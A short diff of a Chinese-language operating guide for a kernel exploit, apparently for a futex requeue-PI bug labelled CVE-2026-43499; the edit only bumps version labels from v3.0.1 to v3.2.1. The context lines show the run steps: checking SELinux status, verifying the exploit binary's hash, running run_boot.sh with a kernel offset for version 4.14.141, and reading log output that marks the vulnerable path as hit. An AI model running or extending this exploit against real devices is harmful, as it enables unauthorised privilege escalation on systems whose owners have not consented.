@@ -31,7 +31,7 @@ cat /sys/fs/selinux/enforce          # 1=Enforcing(目标), 0=Permissive(已放�
 
 ---
 
-## 2. 更新到 v3.0.1（覆盖旧二进制）
+## 2. 更新到 v3.2.1（覆盖旧二进制）
 
 ```sh
 cd ~/cve_2026_43499
@@ -53,7 +53,7 @@ sha256sum exploit    # 必须 = 6676881cbafa1691572f29a914ddcc8d99f1f76f2664db41
 sh run_boot.sh
 ```
 
-**v3.0.1 新日志（关键看这 4 行 + 末尾）：**
+**v3.2.1 新日志（关键看这 4 行 + 末尾）：**
 
 ```
 [*] main: CMP_REQUEUE_PI ret=ffffffdd    ← -35=EDEADLK: 漏洞路径命中!
@@ -84,7 +84,7 @@ sh run_boot.sh -s 0xC211E598    # offsets.json 的 4.14.141 值(未验证, 仅�
 
 ---
 
-## 4. 故障排查（v3.0.1）
+## 4. 故障排查（v3.2.1）
 
 | # | 现象 | 原因/对策 |
 |---|---|---|
